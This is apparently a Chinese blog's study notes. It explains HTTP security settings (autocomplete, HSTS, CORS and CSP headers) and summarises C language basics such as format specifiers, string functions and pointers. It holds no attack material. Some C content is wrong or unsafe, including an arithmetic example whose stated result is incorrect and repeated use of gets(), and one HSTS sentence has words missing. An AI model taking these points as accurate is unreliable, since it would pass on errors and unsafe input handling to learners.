<h2 id="HTTP安全"><a href="#HTTP安全" class="headerlink" title="HTTP安全"></a>HTTP安全</h2><h3 id="用户信息安全"><a href="#用户信息安全" class="headerlink" title="用户信息安全"></a>用户信息安全</h3><h4 id="如何关闭表单自动填充"><a href="#如何关闭表单自动填充" class="headerlink" title="如何关闭表单自动填充"></a>如何关闭表单自动填充</h4><p>浏览器能够提供自动补全（在用户开始输入的时候给用户提供可能的内容）和自动填充（在加载的时候预先填充某些字段）功能，但可能涉及用户的隐私，因此浏览器允许用户禁用这些功能</p>
<h5 id="禁止自动补全"><a href="#禁止自动补全" class="headerlink" title="禁止自动补全"></a>禁止自动补全</h5><p>将 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/autocomplete"><code>autocomplete</code></a> 的属性设置为 “off”</p>
<p>为整个表单设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; action=&quot;/form&quot; autocomplete=&quot;off&quot;&gt;[…]&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>为表单中某个输入元素单独设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; action=&quot;/form&quot;&gt;</span><br><span class="line">  […]</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for=&quot;cc&quot;&gt;信用卡：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;cc&quot; name=&quot;cc&quot; autocomplete=&quot;off&quot; /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>一些浏览器（如 Chrome 和 Edge）即使设置了 <code>autocomplete=&quot;off&quot;</code>，仍会尝试为用户名和密码字段提供自动填充功能，那么你需要更改输入元素的 <code>name</code> 属性（浏览器通常会根据字段的 <code>name</code> 属性判断其用途，可以为这些字段设置随机或无意义的 <code>name</code> 值）</p>
<h5 id="autocomplete-属性和登录字段"><a href="#autocomplete-属性和登录字段" class="headerlink" title="autocomplete 属性和登录字段"></a>autocomplete 属性和登录字段</h5><p>如果你定义了一个用户管理页面，其中用户可以为其他人指定新的密码，因此你想阻止密码字段的自动填充，你可以使用 <code>autocomplete=&quot;new-password&quot;</code></p>
<h3 id="内容安全"><a href="#内容安全" class="headerlink" title="内容安全"></a>内容安全</h3><h4 id="正确配置服务器-MIME-类型"><a href="#正确配置服务器-MIME-类型" class="headerlink" title="正确配置服务器 MIME 类型"></a>正确配置服务器 MIME 类型</h4><ul>
<li><code>text/html</code>对于一般网页</li>
<li><code>text/plain</code>对于一般文本</li>
<li><code>text/css</code>对于级联样式表</li>
<li><code>text/javascript</code>对于脚本</li>
<li><code>application/octet-stream</code>意味着“下载这个文件”</li>
<li><code>application/x-java-applet</code>对于 Java 小程序</li>
<li><code>application/pdf</code>对于 PDF 文档</li>
</ul>
<h4 id="严格传输安全-HTTP-Strict-Transport-Security-HSTS）"><a href="#严格传输安全-HTTP-Strict-Transport-Security-HSTS）" class="headerlink" title="严格传输安全 (HTTP Strict Transport Security, HSTS）"></a>严格传输安全 (HTTP Strict Transport Security, HSTS）</h4><p>通过强制使用 HTTPS 而非 HTTP 来防止协议降级攻击和会话劫持</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Strict-Transport-Security: max-age=&lt;expire-time&gt;[; includeSubDomains][; preload]</span><br></pre></td></tr></table></figure>

<p><strong><code>max-age</code></strong>: 必须指定，表示 HSTS 策略的有效期（单位：秒）。例如，<code>max-age=31536000</code> 表示策略有效期为 1 年。</p>
<p><strong><code>includeSubDomains</code></strong>: 可选，表示 HSTS 策略适用于主域及其所有子域。</p>
<p>如果设置了该参数，则 <code>sub.example.com</code> 也会强制使用 HTTPS。</p>
<p><strong><code>preload</code></strong>: 可选，指示该域名申请加入浏览器的 HSTS 预加载列表。需要通过 HSTS Preload 提交，当使用 ， 指令必须至少是 （一年），并且必须存在指令</p>
<h4 id="跨源资源共享（CORS）"><a href="#跨源资源共享（CORS）" class="headerlink" title="跨源资源共享（CORS）"></a>跨源资源共享（CORS）</h4><p>一种基于 HTTP 标头的机制，用于允许服务器声明哪些来源（域名）可以访问其资源。它解决了浏览器的 <strong>同源策略</strong> 限制问题，从而安全地实现跨域资源的共享</p>
<h5 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h5><p>请求方法是 <code>GET</code>、<code>POST</code> 或 <code>HEAD</code>。</p>
<p>不包含自定义的请求标头（如 <code>Authorization</code>）。</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> 标头所指定的媒体类型的值仅限于下列三者之一：</p>
<ul>
<li><code>application/x-www-form-urlencoded</code></li>
<li><code>multipart/form-data</code></li>
<li><code>text/plain</code></li>
</ul>
<p>浏览器会直接发送请求，并根据响应头判断是否允许访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/data HTTP/1.1 </span><br><span class="line">Host: api.example.com </span><br><span class="line">Origin: https://example.com</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Access-Control-Allow-Origin: https://example.com</span><br></pre></td></tr></table></figure>

<p>如果 <code>Access-Control-Allow-Origin</code> 标头的值与请求的 <code>Origin</code> 匹配，则浏览器允许访问响应数据</p>
<h5 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a>预检请求</h5><p>对于非简单请求（如使用 <code>PUT</code>、<code>DELETE</code> 方法，或自定义标头），浏览器会在正式请求之前发送一个 <strong>预检请求</strong>（<code>OPTIONS</code> 请求），以确保服务器允许此操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OPTIONS /api/data HTTP/1.1</span><br><span class="line">Host: api.example.com</span><br><span class="line">Origin: https://example.com</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: Authorization</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 204 No Content</span><br><span class="line">Access-Control-Allow-Origin: https://example.com</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: Authorization</span><br><span class="line">Access-Control-Max-Age: 3600</span><br></pre></td></tr></table></figure>

<p><strong><code>Access-Control-Allow-Origin</code></strong>: 指定允许的来源。</p>
<p><strong><code>Access-Control-Allow-Methods</code></strong>: 列出允许的 HTTP 方法。</p>
<p><strong><code>Access-Control-Allow-Headers</code></strong>: 列出允许的请求标头。</p>
<p><strong><code>Access-Control-Max-Age</code></strong>: 指定预检结果的缓存时间（秒）</p>
<h5 id="带凭据的请求"><a href="#带凭据的请求" class="headerlink" title="带凭据的请求"></a>带凭据的请求</h5><p>如果请求需要发送凭据（如 Cookies 或 HTTP 认证），需要满足以下条件：</p>
<ul>
<li>客户端在请求中设置 <code>withCredentials</code> 为 <code>true</code>。</li>
<li>服务器返回的响应头包含 <code>Access-Control-Allow-Credentials: true</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/data HTTP/1.1</span><br><span class="line">Host: api.example.com</span><br><span class="line">Origin: https://example.com</span><br><span class="line">Cookie: sessionId=abc123</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https://example.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p>如果 <code>Access-Control-Allow-Credentials</code> 为 <code>true</code>，<code>Access-Control-Allow-Origin</code> 必须为具体的来源，不能使用通配符 <code>*</code></p>
<h5 id="HTTP响应标头字段"><a href="#HTTP响应标头字段" class="headerlink" title="HTTP响应标头字段"></a>HTTP响应标头字段</h5><p>1.<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Origin"><code>Access-Control-Allow-Origin</code></a> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: &lt;origin&gt; | *</span><br></pre></td></tr></table></figure>

<p><code>Access-Control-Allow-Origin</code> 参数指定了单一的源，告诉浏览器允许该源访问资源。或者，对于<strong>不需要携带</strong>身份凭证的请求，服务器可以指定该字段的值为通配符“<code>*</code>”，表示允许来自任意源的请求</p>
<p>2.<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Expose-Headers"><code>Access-Control-Expose-Headers</code></a> </p>
<p>跨源访问时，<code>XMLHttpRequest</code> 对象的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/getResponseHeader"><code>getResponseHeader()</code></a> 方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头</p>
<p>将指定标头放入允许列表中，供浏览器的 JavaScript 代码（如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/getResponseHeader"><code>getResponseHeader()</code></a>）获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access-Control-Expose-Headers: &lt;header-name&gt;[, &lt;header-name&gt;]*</span><br></pre></td></tr></table></figure>

<p>3.<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Max-Age"><code>Access-Control-Max-Age</code></a></p>
<p>指定了 preflight 请求的结果能够被缓存多久</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access-Control-Max-Age: &lt;delta-seconds&gt;</span><br></pre></td></tr></table></figure>

<p>4.<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials"><code>Access-Control-Allow-Credentials</code></a> </p>
<p>指定了当浏览器的 <code>credentials</code> 设置为 true 时是否允许浏览器读取 response 的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p>5.<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Methods"><code>Access-Control-Allow-Methods</code></a> </p>
<p>指定了访问资源时允许使用的请求方法，用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</span><br></pre></td></tr></table></figure>

<p>6.<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Headers"><code>Access-Control-Allow-Headers</code></a> </p>
<p>用于<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Preflight_request">预检请求</a>的响应。其指明了实际请求中允许携带的标头字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Headers: &lt;header-name&gt;[, &lt;header-name&gt;]*</span><br></pre></td></tr></table></figure>

<h5 id="HTTP请求标头字段"><a href="#HTTP请求标头字段" class="headerlink" title="HTTP请求标头字段"></a>HTTP请求标头字段</h5><p>1.<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin"><code>Origin</code></a> </p>
<p>表明预检请求或实际跨源请求的源站</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Origin: &lt;origin&gt;</span><br></pre></td></tr></table></figure>

<p>origin 参数的值为源站 URL。它不包含任何路径信息，只是服务器名称</p>
<p>2.<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Method"><code>Access-Control-Request-Method</code></a> </p>
<p>用于预检请求。其作用是，将实际请求所使用的 HTTP 方法告诉服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access-Control-Request-Method: &lt;method&gt;</span><br></pre></td></tr></table></figure>

<p>3.<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Headers"><code>Access-Control-Request-Headers</code></a> </p>
<p>用于预检请求，将实际请求所携带的标头字段（通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/setRequestHeader"><code>setRequestHeader()</code></a> 等设置的）告诉服务器。这个浏览器端标头将由互补的服务器端标头 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Headers"><code>Access-Control-Allow-Headers</code></a> 回答</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</span><br></pre></td></tr></table></figure>

<h4 id="内容安全策略（CSP）"><a href="#内容安全策略（CSP）" class="headerlink" title="内容安全策略（CSP）"></a><strong>内容安全策略</strong>（CSP）</h4><p>是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本（XSS）和数据注入攻击等</p>
<p>为使 CSP 可用，你需要配置你的网络服务器返回 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy"><code>Content-Security-Policy</code></a> HTTP 标头，除此之外，<code>&lt;meta&gt;</code>元素也可以被用来配置该策略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://trusted.cdn.com&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="CSP-示例配置"><a href="#CSP-示例配置" class="headerlink" title="CSP 示例配置"></a><strong>CSP 示例配置</strong></h5><h6 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h6><p>只允许从同源加载资源，禁止内联脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;;</span><br></pre></td></tr></table></figure>

<h6 id="允许可信第三方资源"><a href="#允许可信第三方资源" class="headerlink" title="允许可信第三方资源"></a>允许可信第三方资源</h6><p>允许从指定的 CDN 加载 JavaScript 和样式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; https://cdn.example.com; style-src &#x27;self&#x27; https://cdn.example.com;</span><br></pre></td></tr></table></figure>

<h6 id="启用报告机制"><a href="#启用报告机制" class="headerlink" title="启用报告机制"></a>启用报告机制</h6><p>当策略被违反时，将报告发送到指定的 URL：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; report-uri /csp-report-endpoint;</span><br></pre></td></tr></table></figure>

<h6 id="防止-iframe-嵌套"><a href="#防止-iframe-嵌套" class="headerlink" title="防止 iframe 嵌套"></a>防止 iframe 嵌套</h6><p>禁止页面被嵌套在 <code>&lt;iframe&gt;</code> 中，防止点击劫持攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: frame-ancestors &#x27;none&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250122092258684.png"></p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250122092258689.png" alt="屏幕截图 2025-01-22 092240"></p>
<h3 id="X-框架选项"><a href="#X-框架选项" class="headerlink" title="X 框架选项"></a>X 框架选项</h3><p>‘’’</p>
<h2 id="HTTP标头"><a href="#HTTP标头" class="headerlink" title="HTTP标头"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers">HTTP标头</a></h2>]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
  </entry>
  <entry>
    <title>C语言</title>
    <url>/2025/02/05/C%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<h1 id="C语言易错难懂知识"><a href="#C语言易错难懂知识" class="headerlink" title="C语言易错难懂知识"></a>C语言易错难懂知识</h1><h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><p>1.进制</p>
<p>二进制：0b开头</p>
<p>八进制：0开头</p>
<p>十六进制：0X开头（0<del>9，A</del>F）</p>
<p>2.float  4字节 有效数字6</p>
<p>   double  8字节 有效数字15</p>
<p>不同类型数据运算时，除强制类型转换外，结果都为double型</p>
<p>在一个整数末尾加L&#x2F;l表示长整型</p>
<p>eg. int b&#x3D;5;</p>
<p>​      float a&#x3D;2.0;</p>
<p>​      b&#x3D;b&#x2F;2*a; &#x2F;&#x2F;b&#x3D;5</p>
<p>3.素数中：不必被2<del>（n-1）整除，只需被2</del>✓n即可，j*j&lt;i</p>
<p>4.a%b结果由a的正负性决定，只要a为负数，结果为负数</p>
<p>5.常量和常变量</p>
<p>常变量：在定义变量时，加一个const</p>
<p>​            eg.const int a&#x3D;3;</p>
<p>变量：</p>
<p>（1）整型变量 1000</p>
<p>（2）实型变量 12.34e3</p>
<p>（3）字符常量（只能为一个字符,’ \42 ‘为一个字符）</p>
<p>​       1）普通字符：以ASCII码存储</p>
<p>​                                常见的ASCII：’A’ &#x3D;65   ‘a’ &#x3D;97   0 &#x3D;48</p>
<p>​       2）转义字符：以’ \ ‘开头，将’ \ ‘后的字符转化为另外意思</p>
<p>​                             eg.’ \x41 ‘表示16进制41的ASCII字符，即’ A ‘</p>
<p>​       3）字符串常量：“boy”</p>
<p>​       4）符号常量（不能对其赋新值）：#define PI 3.1416</p>
<p>6.标识符：只由字母，数字，下划线组成；第一个字符必须是字母或下划线</p>
<p>7.unsigned int &#x3D;&gt;无符号整型  输出用%u</p>
<p>   （充分利用变量的值的范围（数据范围只有正值））</p>
<p>8.逗号表达式结果取后面的值</p>
<p>  eg.i&#x3D;(a&#x3D;6,a*5),a+6;&#x2F;&#x2F;&gt;i&#x3D;30</p>
<p>9.要输出%应该连续使用2个%</p>
<p>10.字符变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char c=&#x27; ? &#x27;;</span><br><span class="line">printf(&quot;%d %c&quot;,c,c);</span><br><span class="line">=&gt;63 ?</span><br></pre></td></tr></table></figure>

<p>11.i++和++i</p>
<p>i&#x3D;3;</p>
<p>j&#x3D;i++(i&#x3D;4,j&#x3D;3)&#x2F;&#x2F;先赋值后自加</p>
<p>j&#x3D;++i(i&#x3D;4,j&#x3D;4)&#x2F;&#x2F;先自加在赋值</p>
<p>12.输出：</p>
<p>用%f得到6位小数</p>
<p>%-m.nf ：</p>
<p>​	   -号为左对齐</p>
<p>​	  m为最小宽度：输出的总宽度（包括小数点、小数部分和整数部分）如果实际数据长度小于 m，将用空格填充；如果数据长度超过 				     m，则按实际长度输出，不截断</p>
<p>​	  n为小数小数位数：如果实际小数位数超过 n，会进行四舍五入；如果不足n，会用0补足</p>
<p>%e指定以指数形式输出实数，自动给出数字部分小数位数为6位，指数部分占5列</p>
<p>eg.1.234560 e+002</p>
<p>13.运算符优先级</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250117135802930.png"></p>
<p>14.字符（一个）输入输出：</p>
<p>getchar  putchar(c)</p>
<p>15.在判断一个量是否为真时，0为假，非0为真</p>
<p>a&amp;&amp;b&#x2F;&#x2F;a和b都非0（只有a为真时，才需要判别b的值）</p>
<p>a||b&#x2F;&#x2F;a和b至少一个非0（只有a为假时才需要判别b的值）</p>
<p>16.判断非闰年：</p>
<p><code>!((year%4==0&amp;&amp;year%100!=0)||year%400==0)</code></p>
<p>17.两个数乘积&#x3D;两个数最大公约数 x 最小公倍数</p>
<h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><h3 id="？：表达式（代替复杂的if）"><a href="#？：表达式（代替复杂的if）" class="headerlink" title="？：表达式（代替复杂的if）"></a>？：表达式（代替复杂的if）</h3><p>max&#x3D;(a&gt;b)?a:b;&#x2F;&#x2F;a&gt;b为真的话，max&#x3D;a，否则为b</p>
<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>switch(表达式){</p>
<p>​	case 常量1:语句1;</p>
<p>​	……</p>
<p>​	default:……;</p>
<p>}</p>
<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><p>只要循环条件表达式为真时，就执行</p>
<p>eg.while(i–)&#x2F;&#x2F;每次循环开始先检查i当前值是否为真，若为真，循环继续，每次循环结束时i值减少一</p>
<h3 id="do-while语句"><a href="#do-while语句" class="headerlink" title="do while语句"></a>do while语句</h3><p>先无条件执行，再判断循环条件是否成立</p>
<h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><p>for(…;…[只要值为真，就执行循环];…)</p>
<h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>break：提前终止循环</p>
<p>continue：提前结束本次循环，接着执行下次循环</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><code>a[3][4]</code> &#x3D;&gt;3行4列</p>
<h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><h4 id="字符串结束标志"><a href="#字符串结束标志" class="headerlink" title="字符串结束标志"></a>字符串结束标志</h4><p>一个字符串以字符<code>&#39;\0&#39;</code>作为结束标志（c语言在字符数组储存字符串常量市会自动加一个’\0’作结束符）</p>
<h4 id="字符数组的输入输出"><a href="#字符数组的输入输出" class="headerlink" title="字符数组的输入输出"></a>字符数组的输入输出</h4><p>%s &#x3D;&gt;整个字符串</p>
<p>%c &#x3D;&gt;一个字符</p>
<p>输出时遇到’\0’就停止输出</p>
<p>scanf输入项如果是字符数组名，不加&amp;</p>
<p>scanf读取字符串时，会在遇空白字符时停止读取</p>
<h5 id="单行字符串"><a href="#单行字符串" class="headerlink" title="单行字符串"></a>单行字符串</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while((ch=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">	a[i]=ch;</span><br><span class="line">	i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char string[100];</span><br><span class="line">char c;</span><br><span class="line">gets(string);</span><br><span class="line">for(int i=0;(c=string[i])!=&#x27;\0&#x27;;i++)&#123;···&#125;\\遍历字符串中每个字符</span><br></pre></td></tr></table></figure>

<h5 id="n行字符串"><a href="#n行字符串" class="headerlink" title="n行字符串"></a>n行字符串</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">getchar();</span><br><span class="line">char a[100];</span><br><span class="line">for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">	gets(a);</span><br><span class="line">	···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">getchar();</span><br><span class="line">char string[n][100];</span><br><span class="line">for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">	gets(string[i]);</span><br><span class="line">	for(int j=0;string[i][j]!=&#x27;\0&#x27;;j++)&#123;···&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h4><p>记得加<code>#include&lt;string.h&gt;</code></p>
<h5 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h5><p>输出的字符串中可以包含转义字符</p>
<p>e.g </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char str[]=&#123;&quot;abc \n def&quot;&#125;;</span><br><span class="line">puts(str);</span><br><span class="line">   =&gt;abc</span><br><span class="line">     def</span><br></pre></td></tr></table></figure>

<h5 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h5><p>从终端输入一个字符串到字符数组，并且得到一个函数值，该函数值是字符数组的起始地址</p>
<p>注：gets和puts函数只能输入&#x2F;输出一个字符串</p>
<h5 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h5><p>把两个字符数组中字符串连接起来</p>
<p>strcat(str1,str2);</p>
<h5 id="strcpy和strncpy"><a href="#strcpy和strncpy" class="headerlink" title="strcpy和strncpy"></a>strcpy和strncpy</h5><p>字符串复制函数</p>
<h6 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h6><p>将字符串2复制到字符数组1中</p>
<p>注：赋值语句只能将一个字符赋给一个字符型变量&#x2F;字符数组元素</p>
<h6 id="strncpy"><a href="#strncpy" class="headerlink" title="strncpy"></a>strncpy</h6><p>将字符串2中前n个字符复制到字符数组1中</p>
<p>strncpy(str1,str2,2);&#x2F;&#x2F;将str2前2个取代str1原有的2个</p>
<h5 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h5><p>字符串比较：2个字符串从左到右逐个比较（ASCII值），直到出现不同字符或遇到’\0’为止</p>
<p>字符串1&#x3D;字符串2  函数值为0</p>
<p>字符串1&gt;字符串2  函数值为正整数</p>
<p>字符串1&lt;字符串2  函数值为负整数</p>
<h5 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h5><p>测字符串长度</p>
<h5 id="strlwr"><a href="#strlwr" class="headerlink" title="strlwr"></a>strlwr</h5><p>转换为小写</p>
<h5 id="strupr"><a href="#strupr" class="headerlink" title="strupr"></a>strupr</h5><p>转换为大写</p>
<h4 id="头文件"><a href="#头文件" class="headerlink" title="&lt;ctype.h&gt;头文件"></a>&lt;ctype.h&gt;头文件</h4><p>isalpha判断一个字符是否是字母</p>
<p>isdigit判断一个字符是否是数字</p>
<p>islower判断一个字符是否是小写字母</p>
<p>isupper判断一个字符是否是大写字母</p>
<p>isspace判断一个字符是否是空白字符</p>
<p>tolower将字符大写变小写</p>
<p>toupper将字符小写变大写</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的定义与声明"><a href="#函数的定义与声明" class="headerlink" title="函数的定义与声明"></a>函数的定义与声明</h3><p>在定义函数时要指定函数的类型</p>
<p>函数类型决定返回值类型</p>
<p>用函数原型（函数首部）作函数声明</p>
<p>e.g int add(int a,int b);</p>
<h3 id="函数的嵌套"><a href="#函数的嵌套" class="headerlink" title="函数的嵌套"></a>函数的嵌套</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int max4(int a,int b,int c,int d)&#123;</span><br><span class="line">	int max2(int a,int b);</span><br><span class="line">	return max2(max2(max2(a,b),c),d);</span><br><span class="line">&#125;</span><br><span class="line">int max2(int a,int b)&#123;</span><br><span class="line">	return(a&gt;=b?a:b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="局部与全局变量"><a href="#局部与全局变量" class="headerlink" title="局部与全局变量"></a>局部与全局变量</h3><p>注：全局变量开头一般用大写字母，来区别局部变量</p>
<h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><p>静态局部&#x2F;全局变量</p>
<p>函数中局部变量的值在函数调用结束后不消失而继续保留本次调用结束后的值</p>
<p>e.g <code>static int f=1;</code></p>
<h4 id="extern"><a href="#extern" class="headerlink" title="extern"></a>extern</h4><p>外部变量声明</p>
<p>在一个文件内扩展外部变量的作用域</p>
<p>将外部变量的作用域扩展到其他文件</p>
<p>e.g <code>extern A,B,C; \ \可省略int等类型</code></p>
<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h3 id="指针变量"><a href="#指针变量" class="headerlink" title="指针变量"></a>指针变量</h3><p>指针是一个地址，而指针变量是存放地址的变量</p>
<p>指针变量中只能存放地址（指针），不要将一个整数给指针变量</p>
<p>p&#x3D;&a;</p>
<p>*p&#x3D;1;\ \将1赋值给p所指向的变量即把1赋给a</p>
<p>定义：类型名 * 指针变量名</p>
<p>​	int* point;      </p>
<p>​	point&#x3D;&a;\ \等价于int* point&#x3D;&a;</p>
<p>函数调用时不加*</p>
<p>e.g swap(point_1,point_2);</p>
<p>为使在函数中改变的变量能被main所用，应该用指针变量做函数参数</p>
<p>e.g</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void swap(int *p1,int *p2)&#123;</span><br><span class="line">	int temp;</span><br><span class="line">	temp=*p1;</span><br><span class="line">	*p1=*p2;</span><br><span class="line">	*p2=temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通过指针引用数组"><a href="#通过指针引用数组" class="headerlink" title="通过指针引用数组"></a>通过指针引用数组</h3><h4 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *p;</span><br><span class="line">p=&amp;a[0];\\不能写成*p=&amp;a[0];</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=&amp;a[0];</span><br><span class="line">p=a;\\p的值是数组a的首元素</span><br></pre></td></tr></table></figure>

<p>如果指针元素p指向数组中的一个元素，则p+1指向同一数组的下个元素，p-1指向同一数组的上个元素</p>
<p>如果p的初值为&amp;a[0]，则p+i&#x2F;a+i即a[i]的地址，*(p+i)&#x2F; *(a+i)是p+i&#x2F;a+i所指向的数组元素即a[i]</p>
<p>两个地址不能相加</p>
<p>若指针变量p1、p2都指向同一数组中的元素，p2-p1结果为(p2-p1)的值（地址之差）</p>
